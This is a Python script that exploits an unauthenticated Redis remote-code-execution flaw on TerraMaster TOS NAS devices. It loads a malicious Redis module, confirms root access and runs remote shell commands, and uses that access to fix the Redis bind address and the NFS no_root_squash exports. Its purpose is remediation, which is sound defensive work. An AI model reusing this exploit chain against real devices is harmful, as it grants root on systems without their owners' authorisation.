#!/usr/bin/env python3
"""
patch.py — Exploit TerraMaster TOS Redis RCE to patch both vulnerabilities.

Bug 1 (RCE): /etc/init.d/redis is a symlink to /usr/sbin/desh, which runs
             /etc/init.d/redis.en — an encrypted script that starts
             "redis-server 0.0.0.0:6379", ignoring /etc/redis.conf (which
             already has "bind 127.0.0.1").
Fix:         Replace the desh symlink with a proper init script that starts
             redis-server with /etc/redis.conf.  Ensure daemonize yes is set.

Bug 2 (LPE): /etc/exports has no_root_squash on NFS exports.
Fix:         Replace no_root_squash with root_squash and re-export.

Usage:
    python3 patch.py <NAS_IP>
    python3 patch.py <NAS_IP> --lhost <ATTACKER_IP>
    python3 patch.py <NAS_IP> --no-restart
"""

import argparse
import base64
import os
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(SCRIPT_DIR, "rce"))

import poc
from poc import (
    Progress, deliver_module, redis_load_module, redis_exec,
    redis_cmd, info, good, warn, bail,
)

REDIS_INIT = """\
#!/bin/sh
# Patched by patch.py — uses /etc/redis.conf instead of hardcoded 0.0.0.0:6379
DAEMON=/usr/bin/redis-server
CONF=/etc/redis.conf

case "$1" in
  start)
    "$DAEMON" "$CONF"
    ;;
  stop)
    redis-cli shutdown nosave 2>/dev/null || killall redis-server 2>/dev/null
    ;;
  restart|reload)
    "$0" stop
    sleep 1
    "$0" start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}" >&2
    exit 1
    ;;
esac
"""


def rexec(sock, cmd):
    """Execute a shell command on the target via system.exec."""
    return redis_exec(sock, cmd)


def write_remote(sock, path, content, mode=None):
    """Write a text file on the target via base64-encoded echo."""
    b64 = base64.b64encode(content.encode()).decode()
    rexec(sock, f"echo '{b64}' | base64 -d > {path}")
    if mode:
        rexec(sock, f"chmod {mode} {path}")


def patch_redis(sock):
    """Replace the desh-encrypted Redis init script with one that honours
    /etc/redis.conf, and ensure the config has daemonize yes."""

    # --- verify the config already binds to localhost ---
    bind_line = rexec(sock, "grep '^bind ' /etc/redis.conf")
    if "127.0.0.1" not in bind_line:
        bail(f"/etc/redis.conf bind is not 127.0.0.1: {bind_line.strip()}")
    good(f"redis.conf bind verified: {bind_line.strip()}")

    # --- ensure daemonize yes (stock config ships 'daemonize no') ---
    daemonize = rexec(sock, "grep '^daemonize ' /etc/redis.conf")
    if "yes" not in daemonize:
        info("Setting daemonize yes in /etc/redis.conf")
        rexec(sock, "sed -i 's/^daemonize .*/daemonize yes/' /etc/redis.conf")
        verify = rexec(sock, "grep '^daemonize ' /etc/redis.conf")
        if "yes" not in verify:
            rexec(sock, "echo 'daemonize yes' >> /etc/redis.conf")
        good("daemonize yes set")
    else:
        good(f"redis.conf daemonize verified: {daemonize.strip()}")

    # --- safety: confirm init script is the vulnerable desh symlink ---
    target = rexec(sock, "readlink /etc/init.d/redis 2>/dev/null || echo NOT_A_SYMLINK")
    if "/usr/sbin/desh" not in target:
        warn(f"/etc/init.d/redis is not the expected desh symlink ({target.strip()})")
        warn("Skipping init script replacement — may already be patched")
        return

    # --- replace the symlink with a real init script ---
    rexec(sock, "cp -a /etc/init.d/redis /etc/init.d/redis.bak.pre-patch 2>/dev/null; true")
    rexec(sock, "rm -f /etc/init.d/redis")
    write_remote(sock, "/etc/init.d/redis", REDIS_INIT, mode="755")

    head = rexec(sock, "head -2 /etc/init.d/redis")
    if "#!/bin/sh" not in head:
        bail("Failed to write /etc/init.d/redis")
    good("Patched /etc/init.d/redis — will use /etc/redis.conf on restart")


def patch_nfs(sock):
    """Replace no_root_squash with root_squash in /etc/exports and re-export."""
    exports = rexec(sock, "cat /etc/exports 2>/dev/null")
    if not exports.strip():
        warn("/etc/exports is empty or missing — skipping NFS patch")
        return

    if "no_root_squash" not in exports:
        warn("no_root_squash not found in /etc/exports — already fixed or not present")
        return

    info(f"Current /etc/exports:\n{exports.strip()}")
    rexec(sock, "cp /etc/exports /etc/exports.bak.pre-patch")
    rexec(sock, "sed -i 's/no_root_squash/root_squash/g' /etc/exports")

    patched = rexec(sock, "cat /etc/exports")
    if "no_root_squash" in patched:
        bail("sed replacement failed on /etc/exports")
    good(f"Patched /etc/exports:\n{patched.strip()}")

    rexec(sock, "exportfs -ra 2>/dev/null; true")
    good("NFS re-exported with root_squash")


def main():
    parser = argparse.ArgumentParser(
        description="Exploit TerraMaster TOS Redis RCE to patch both bugs",
    )
    parser.add_argument("host", help="NAS IP address")
    parser.add_argument("--lhost", default=None,
                        help="Attacker IP reachable from target (default: auto)")
    parser.add_argument("--no-restart", action="store_true",
                        help="Skip Redis restart after patching")
    args = parser.parse_args()

    poc._progress = Progress(total=8)

    # --- load the .so payload ---
    module_so = os.path.join(SCRIPT_DIR, "rce", "module.so")
    if not os.path.isfile(module_so):
        bail(f"{module_so} not found — run 'make' in rce/")
    payload = open(module_so, "rb").read()
    info(f"Loaded {module_so} ({len(payload)} bytes)")

    # --- phase 1: exploit the RCE ---
    module_path = deliver_module(args.host, payload, lhost=args.lhost)
    sock = redis_load_module(args.host, module_path)

    whoami = rexec(sock, "id")
    if "uid=0" not in whoami:
        bail(f"Not root: {whoami.strip()}")
    good(f"Root: {whoami.strip()}")

    # --- phase 2: patch both bugs ---
    try:
        patch_redis(sock)
        patch_nfs(sock)
    except SystemExit:
        raise
    except Exception as e:
        warn(f"Patch failed: {e}")
        rexec(sock, f"rm -f {module_path}")
        try:
            redis_cmd(sock, "MODULE", "UNLOAD", "system")
        except OSError:
            pass
        sock.close()
        return 1

    # --- phase 3: cleanup exploit artifacts ---
    info("Removing exploit module from disk")
    rexec(sock, f"rm -f {module_path}")

    if not args.no_restart:
        info("Scheduling Redis restart in 2s")
        rexec(sock, "nohup sh -c 'sleep 2; /etc/init.d/redis restart' >/dev/null 2>&1 &")
        good("Redis will restart bound to 127.0.0.1 in ~2 seconds")
    else:
        warn("Skipped restart — run '/etc/init.d/redis restart' to apply Redis bind fix")

    try:
        redis_cmd(sock, "MODULE", "UNLOAD", "system")
    except (BrokenPipeError, OSError):
        pass
    try:
        sock.close()
    except OSError:
        pass

    good("Both vulnerabilities patched")
    return 0


if __name__ == "__main__":
    sys.exit(main())
